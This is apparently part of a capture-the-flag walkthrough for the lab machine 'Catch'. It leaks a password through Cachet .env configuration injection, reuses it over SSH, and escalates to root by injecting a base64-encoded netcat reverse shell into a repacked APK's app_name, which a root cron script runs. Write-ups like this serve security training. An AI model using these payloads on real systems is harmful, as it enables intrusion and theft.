[This article from SonarSource](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection) discloses a few vulnerabilities in Cachet versions <= 2.4 that involve the `.env` configuration file it pulls its settings from. The vulnerability makes it possible to both read and write to this configuration file, opening up opportunities for information disclosure and remote code execution.

In this case, it is the former. Updating the "Mail from Address" value in Cachet's Mail Settings to `${DB_PASSWORD}` causes Cachet to render the value from `.env`: `s2#4Fg0_%3!`.

![](images/Pasted%20image%2020220315170020.png)

![](images/Pasted%20image%2020220315170117.png)

Spraying this password at the target via SSH using the usernames from Let's Chat, the credential `will`:`s2#4Fg0_%3!` is valid. Grab the user flag from `/home/will/user.txt`.

```bash
$ ssh will@catch.htb
will@catch.htb's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 15 Mar 2022 08:57:28 PM UTC

  System load:                      0.34
  Usage of /:                       74.6% of 16.61GB
  Memory usage:                     86%
  Swap usage:                       24%
  Processes:                        437
  Users logged in:                  0
  IPv4 address for br-535b7cf3a728: 172.18.0.1
  IPv4 address for br-fe1b5695b604: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.184.119
  IPv6 address for eth0:            dead:beef::250:56ff:fe96:2133

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

will@catch:~$ id
uid=1000(will) gid=1000(will) groups=1000(will)
will@catch:~$ ls -la ~/user.txt
-rw-r----- 1 will will 33 Mar 15 13:50 /home/will/user.txt
```

---

## MDM Verification Privilege Escalation

`root` appears to be running a cronjob every so often executing `/bin/bash /opt/mdm/verify.sh`.

`will` has read and execute access to `/opt/mdm`. He has read, write, and execute access to `/opt/mdm/apk_bin/`. He has read and execute access to `/opt/mdm/verify.sh`.

```bash
will@catch:~$ getfacl /opt/mdm/
getfacl: Removing leading '/' from absolute path names
# file: opt/mdm/
# owner: root
# group: root
user::rwx
user:will:r-x
group::r-x
mask::r-x
other::--x

will@catch:~$ getfacl /opt/mdm/*
getfacl: Removing leading '/' from absolute path names
# file: opt/mdm/apk_bin
# owner: root
# group: root
user::rwx
user:will:rwx
group::r-x
mask::rwx
other::--x

# file: opt/mdm/verify.sh
# owner: root
# group: root
user::rwx
user:will:r-x
group::r-x
mask::r-x
other::--x
```

`verify.sh` iterates through the .apk files in `/opt/mdm/apk_bin/`.

For each of these files, it creates two names for the file to be used later. `$OUT_APK_NAME` is `$FILENAME_verified.apk`. This is presumably the name of the file once it has passed "verification." `$APK_NAME` is a random, 12-digit hex string appended with the APK extension (i.e., `123456789abc.apk`).

Once the names are generated, `/opt/mdm/apk_bin/$FILENAME.apk` is moved to `/root/mdm/apk_bin/$APK_NAME`, the random 12-digit hex string filename.

`verify.sh` then executes `sig_check("/root/mdm/apk_bin", "$APK_NAME")`. `sig_check()` calls `jarsigner -verify` on the APK. If it returns a 0, it passes the check. If it doesn't, `verify.sh` exits.

```bash
$ jarsigner -verify catchv1.0.apk

jar verified.

Warning:
This jar contains entries whose certificate chain is invalid. Reason: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
This jar contains entries whose signer certificate is self-signed.
This jar contains signatures that do not include a timestamp. Without a timestamp, users may not be able to validate this jar after any of the signer certificates expire (as early as 2061-12-04).
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

Re-run with the -verbose and -certs options for more details.

$ echo $?
0
```

`verify.sh` then executes `comp_check("/root/mdm/apk_bin", "$APK_NAME", "/root/mdm/process_bin")`. `comp_check()` calls `apktools d -s` on the APK, deflating it and outputting the contents into `/root/mdm/process_bin`. It then greps out the `compileSdkVersion` from the APK's `AndroidManifest.xml`. If the version is greater than or equal to 18, the application passes the check. If it doesn't, `verify.sh` exits.

```bash
$ grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" catchv1.0/AndroidManifest.xml
32
```

`verify.sh` then executes `app_check("/root/mdm/process_bin", "/root/mdm/certified_apps", "/root/mdm/apk_bin", "$OUT_APK_NAME")`. `app_check()` filters the `app_name` tag from the APK's `strings.xml`. If it contains the string "Catch," it is passed to `sh -c mkdir $APP_NAME`.

If an APK can be produced that passes `jarsigner` verification, contains a `compileSdkVersion` greater than or equal to 18 in its `AndroidManifest.xml`, and whose `app_name` tag in `res/values/strings.xml` contains the string "Catch," then the `app_name` value will be passed into `mkdir`. By naming the application `Catch;$COMMAND`, it is possible to execute `$COMMAND` as `root`.

The payload will be a bsae64-encoded reverse shell command.

```bash
will@catch:/dev/shm/tgihf$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.122 443 >/tmp/f' | base64 -w 0
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTIyIDQ0MyA+L3RtcC9mCg==
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Since `catchv1.0.apk` meets the criteria to pass `verify.sh`'s checks, simply update its `app_name` with the payload, repack it, and transfer the resultant APK to the target.

```bash
$ apktool d catchv1.0.apk
I: Using Apktool 2.6.1 on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/tgihf/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

$ sed -i 's/Catch/Catch;echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTIyIDQ0MyA+L3RtcC9mCg== | base64 -d | sh/g' catchv1.0/res/values/strings.xml

$ cat catchv1.0/res/values/strings.xml | grep app_name
    <string name="app_name">Catch;echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTIyIDQ0MyA+L3RtcC9mCg== | base64 -d | sh</string>

$ apktool b catchv1.0
I: Using Apktool 2.6.1
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...

$ scp catchv1.0/dist/catchv1.0.apk will@catch.htb:/dev/shm/tgihf/tgihf.apk
will@catch.htb's password:
catchv1.0.apk                                                                                                                         100% 2713KB   1.1MB/s   00:02
```

On the target, transfer the APK into `/opt/mdm/apk_bin/` and wait for its execution.

```bash
will@catch:/dev/shm/tgihf$ cp tgihf.apk /opt/mdm/apk_bin/
```

Receive a reverse shell as `root`. Grab the system flag from `/root/root.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.184.119] 33482
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -la /root/root.txt
-rw-r----- 1 root root 33 Mar 15 13:50 /root/root.txt
```
